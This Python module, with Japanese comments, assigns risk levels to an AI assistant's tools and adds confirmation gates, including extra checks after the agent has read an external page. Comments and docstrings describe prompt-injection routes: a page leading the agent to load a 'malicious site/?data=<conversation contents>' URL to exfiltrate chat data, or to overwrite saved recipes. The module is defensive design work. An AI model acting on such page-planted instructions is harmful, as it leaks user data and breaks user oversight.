"""
api/risk.py — 道具の危なさを4段階で持つ。

これまで
--------
agent.py に SENSITIVE_TOOLS という平たい集合が1つあった。

    SENSITIVE_TOOLS = {"send_email", "notify", "run_automation", "enqueue_income"}

これだと2つ困る。

1. **メール送信とWeb検索が同じ扱い。** 承認モードを切ると、送信も確認なしで
   通る。取り返しがつかない物と、ただ読むだけの物を、同じ札で括っている。
2. **承認モードを入り切りする以外の調整ができない。** 「作るのは任せたいが
   送るのは必ず聞いてほしい」という、いちばん普通の要望が表現できない。

段階
----
0 取得のみ      … 読むだけ。何も変わらない（検索・一覧・思い出す）
1 自分の中を変更 … このアプリの中だけが変わる（タスク追加・付箋・メモ）
2 外を変更      … 外のサービスに残る（カレンダー・ドライブ・Notion）
3 取り返せない  … 送る・投稿する・お金が動く（メール送信・通知・副業投入）

既定の振る舞い
--------------
0 と 1 は確認しない。
2 は承認モードのときだけ確認する。
**3 は承認モードに関わらず必ず確認する。**

3を必ず確認にしているのがこの変更の芯。「承認モードを切っていたから
黙ってメールが飛んだ」を、設定の組み合わせで起こせないようにする。
"""

import contextvars
from contextlib import contextmanager
from typing import Dict, Optional

# 0: 取得のみ / 1: 自分の中 / 2: 外を変更 / 3: 取り返せない
LEVELS: Dict[str, int] = {
    # ── 0 取得のみ ────────────────────────────────────────────────
    "list_state": 0,
    "self_check": 0,
    "watch_report": 0,
    "schedule_list": 0,
    "recall": 0,
    "web_search": 0,
    "web_read": 0,
    # ブラウザで開く・押す。**どこで開くかで段階が変わる**（browser_router）:
    #   手元の台（あなたとしてログイン済み）… 読む=2 / 押す=3
    #   サーバー（誰にもログインしていない）… 0
    # ここに書いてあるのは、場所が分からないとき（一覧表示など）の重いほう。
    "browser_open": 2,
    "browser_act": 3,
    # 保存した手順を流す。中身（押す手があるか）と場所で決まる（browser_router）。
    # ここは場所が分からないときの重いほう
    "recipe_run": 3,
    "recipe_list": 0,
    "email_inbox": 0,
    "calendar_list": 0,
    "income_status": 0,

    # ── 1 このアプリの中だけが変わる ──────────────────────────────
    "add_task": 1,
    "complete_task": 1,
    "add_agenda": 1,
    "board_add_note": 1,
    "remember": 1,
    "save_note": 1,
    "create_document": 1,
    "create_spreadsheet": 1,
    "create_slides": 1,
    "generate_image": 1,
    # 図は描いて見せるだけ。どこにも残らないので、いちばん軽い。
    "draw_diagram": 0,
    "schedule_add": 1,
    "create_automation": 1,
    "create_mission": 1,
    # 手順を残す・消すのは、このアプリの中だけ（流すときに、中身を見せて確認する）
    "recipe_save": 1,
    "recipe_delete": 1,

    # 手元のパソコンの中を見る・書く。
    #
    # 一覧は1（名前しか出ない）。読むのは2——中身が**AIへ渡る**ので、
    # このアプリの中で完結しない。書くのも2（元の内容は相棒が .bak に
    # 残すので、取り返せないほどではない）。
    "local_list": 1,

    # ── 2 外のサービスに残る ──────────────────────────────────────
    "local_read": 2,
    "local_write": 2,
    "local_append": 2,
    "obsidian_note": 2,
    "drive_upload": 2,
    "google_doc": 2,
    "google_sheet": 2,
    "create_google_slides": 2,
    "calendar_add": 2,
    "notion_add": 2,

    # ── 3 取り返せない（必ず確認） ────────────────────────────────
    "send_email": 3,
    "notify": 3,
    "enqueue_income": 3,
    "run_automation": 3,
}

# 段階の説明（画面に出す）
LABELS: Dict[int, str] = {
    0: "読むだけ",
    1: "AIbouの中が変わる",
    2: "外のサービスに残る",
    3: "取り返せない",
}

# 確認のときに添える一言（何が起きるのかを具体的に）
WHY: Dict[str, str] = {
    "local_read": "このファイルの中身がAIへ渡ります。",
    "browser_open": "ログイン済みの画面の中身が、AIへ渡ります。",
    "browser_act": ("あなたのブラウザで、あなたとして操作します。"
                    "押した先が送信や購入だった場合、取り消せません。"),
    "recipe_run": ("保存した手順を、手元の専用ブラウザで流します。押す手順があれば"
                   "あなたとして押すので、送信や購入なら取り消せません。"),
    "local_write": "手元のパソコンのファイルを書き換えます（元の内容は .bak に残ります）。",
    "local_append": "手元のパソコンのファイルに書き足します。",
    "obsidian_note": "今日の日誌に書き足します。",
    "send_email": "送ったメールは取り消せません。",
    "notify": "LINEやSlackに実際に届きます。",
    "enqueue_income": "副業の処理が動き出します。",
    "run_automation": "フローの中身がまとめて実行されます。",
}

# 段階を書き忘れた道具の扱い。
#
# 「たぶん安全」に倒すと、新しい道具を足した人が段階を書き忘れただけで、
# それが黙って実行される。書き忘れは必ず起きるので、いちばん重い扱いにして
# 必ず確認へ回す。害の無い道具なら確認が1回余分に出るだけで済むが、
# 逆だと取り返しがつかない。
#
# なお全部の道具に段階が付いていることはテストで縛ってあるので、
# ここが効くのは「足したのに書き忘れた」瞬間だけ。
UNKNOWN = 3


def level(tool: str, params=None) -> int:
    """その道具の危なさ。`params` があれば、**どこで動くか**まで見て決める。

    ブラウザで押すのは、誰にもログインしていないブラウザなら公開ページを
    触るだけだが、あなたのブラウザならあなたとして押すことになる。同じ道具
    でも重さが違うので、場所を決める所（browser_router）に聞く。
    """
    name = (tool or "").strip()
    if params is not None:
        try:
            import browser_router
            hint = browser_router.level_hint(name, params)
        except Exception:
            hint = None
        if hint is not None:
            return hint
    return LEVELS.get(name, UNKNOWN)


#: 外のページを1枚読んだ**後**は、確認を挟む道具。
#:
#: 理由は「危なさ」ではなく「誰が決めたか」。ページの本文を読んだ時点で、
#: その後にAIが選ぶURLは**そのページに書いてあった文字列**かもしれない。
#: web_read は2つの意味でそこが効く:
#:
#:   ・行き先  … 内向きのアドレスを読ませる踏み台になる（netguard で塞いだ）
#:   ・持ち出し … `https://悪意のあるサイト/?data=<会話の中身>` を読ませれば、
#:                URLに載せて外へ運び出せる。段階0なので今まで無言で通っていた
#:
#: 1枚目は確認しない（「調べて」→検索→1枚読む、がいちばん普通の流れで、
#: ここに確認を挟むと毎回止まる）。2枚目から聞く。聞く画面にはURLが出るので、
#: 持ち出そうとしていれば、その場で見える。
#:
#: 手順も入れる。流すほう（recipe_run）は、ページに書いてあった名前や値で
#: 流させられうる。残すほう（recipe_save）は、ページに書いてあった手順を
#: **いつもの名前で上書き**させられうる——次に本人が安心して流したときに、
#: 中身が差し替わっている。どちらも「誰が決めたか」の話なので、ここで聞く。
CHAIN_AFTER_EXTERNAL = {"web_read", "browser_open", "browser_act",
                        "recipe_run", "recipe_save"}


def may_always_allow(tool: str, external_reads: int = 0, params=None,
                     lv: Optional[int] = None) -> bool:
    """「この操作はいつも許可」を出してよい道具か。

    出してはいけないのが2種類ある。

    段階3（取り返せない）
        毎回聞くことが、この段階の**中身そのもの**。1回押したら以後
        メールが黙って飛ぶなら、段階を分けた意味が無くなる。

    連鎖（外のページを読んだ後の web_read / browser_open / browser_act）
        聞いている理由が「危なさ」ではなく「**誰が決めたか**」。行き先を
        決めたのが本人ではなくページの本文かもしれない、という話なので、
        道具ごとに一度許してよい性質の物ではない。
        （`https://悪い所/?data=<会話の中身>` で持ち出せる）

    `lv` は、呼ぶ側が測り済みの段階（needs_confirmation と同じ）。
    """
    if (level(tool, params) if lv is None else lv) >= 3:
        return False
    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
        return False
    return True


def needs_confirmation(tool: str, approval_mode: bool, external_reads: int = 0,
                       allowed=(), params=None, lv: Optional[int] = None) -> bool:
    """実行の前に人に聞くべきか。

    approval_mode は「確認しながら進める」設定。切っていても、
    段階3（取り返せない）は必ず聞く。設定の組み合わせで
    「黙ってメールが飛ぶ」が起きないようにする。

    external_reads は、この用事の中でこれまでに外のページを読んだ回数。
    1回でも読んでいれば、そこから先の指示はページ由来かもしれないので、
    連鎖しうる道具（CHAIN_AFTER_EXTERNAL）には確認を挟む。

    allowed は、本人が「いつも許可」を押した道具の名前。**上の2つは
    ここに入っていても効かない**——効かせてよい物だけを may_always_allow
    が決めていて、ここでも同じ関門をもう一度通す（画面側の作りが変わっても
    サーバー側が守る）。

    lv は、呼ぶ側が先に測った段階。渡せば測り直さない——ブラウザの道具は
    測るたびに場所を決め直すので、「聞くかどうか」と「実行まで持っていく
    重さ」（ceiling）を**同じ1回の測定**から出すために使う。
    """
    lv = level(tool, params) if lv is None else lv
    if lv >= 3:
        return True
    name = (tool or "").strip()
    if external_reads > 0 and name in CHAIN_AFTER_EXTERNAL:
        return True
    if lv >= 2:
        if name in set(allowed or ()):
            return False
        return bool(approval_mode)
    return False


def chain_reason(tool: str, external_reads: int) -> str:
    """連鎖だから聞いている、と分かる一言。段階の説明とは別に添える。"""
    if external_reads > 0 and (tool or "").strip() in CHAIN_AFTER_EXTERNAL:
        return ("すでに外のページを読んでいます。このURLがそのページに"
                "書かれていた可能性があるため、一度確認します。")
    return ""


def detail(tool: str, params=None) -> str:
    """確認カードに添える「実際に何が起きるか」。見せた物を承認してもらうため。

    recipe_run の引数は**名前だけ**。名前だけ見せて承認させると、中身が
    （別の会話や、ページに唆されたAIに）書き換えられていても気づけない。
    流す手順そのものを出す。
    """
    if (tool or "").strip() != "recipe_run":
        return ""
    try:
        import recipes
        p = params or {}
        values = p.get("values") if isinstance(p.get("values"), dict) else {}
        return recipes.preview(str(p.get("name") or ""), values)
    except Exception:
        return ""


def describe(tool: str, external_reads: int = 0, params=None,
             lv: Optional[int] = None) -> dict:
    """画面に出すための1件ぶん。"""
    lv = level(tool, params) if lv is None else lv
    why = WHY.get(tool, "") if lv >= 1 else ""
    chain = chain_reason(tool, external_reads)
    if chain:
        # 段階の説明だけだと「読むだけなのに、なぜ聞かれるのか」が分からない
        why = (why + " " + chain).strip()
    return {
        "tool": tool,
        "level": lv,
        "label": LABELS.get(lv, LABELS[UNKNOWN]),
        "always_confirm": lv >= 3,
        "may_always": may_always_allow(tool, external_reads, lv=lv),
        "why": why,
        "chained": bool(chain),
        "detail": detail(tool, params),
    }


def table() -> list:
    """全部の道具の段階（設定画面と、説明の突き合わせに使う）。"""
    return [describe(t) for t in sorted(LEVELS)]


# ── 通した重さを、実行まで持っていく ─────────────────────────────────
#
# ブラウザの道具は「どこで開くか」で重さが変わる。ところが、重さを測る時と
# 実際に動かす時は**同じ瞬間ではない**:
#
#   測る  … 手元の台がつながっていない → サーバーで開く → 0（聞かずに通す）
#   動かす … その間に台がつながった     → あなたとして開く → 本当は 2 か 3
#
# 確認カードを出してから押されるまでは、人の時間（数秒〜数分）空く。
# 「公開ページを読む」と見せて承認されたものが、押された時には「あなたと
# して操作する」に変わっている——これを起こさないため、門を通したときの
# 重さを実行まで持っていき、**それより重くなっていたら動かさない**。
#
# 縛りを置くのは確認の門（agent.py / main.py の /chat と /agent/execute /
# approvals.py）。置かれていない呼び出し（# の近道のように、本人が道具と
# 中身を自分で打った物）は縛らない。
_ceiling: contextvars.ContextVar = contextvars.ContextVar("risk_ceiling", default=None)

#: 縛りを超えたときに返す言葉（道具の結果としてAIと人に届く）。
OVER_CEILING = ("実行の直前に、動かす場所が変わりました（手元の台がつながった等）。"
                "確認したときより重い操作になるため、実行していません。"
                "もう一度頼んでもらえれば、改めて確認してから動かします。")


@contextmanager
def ceiling(level: Optional[int]):
    """この中で動く道具は `level` より重くならない。None なら縛らない。"""
    token = _ceiling.set(level)
    try:
        yield
    finally:
        _ceiling.reset(token)


def within_ceiling(actual: int) -> bool:
    """いま動かそうとしている重さが、通した重さに収まっているか。"""
    limit = _ceiling.get()
    return limit is None or int(actual) <= int(limit)
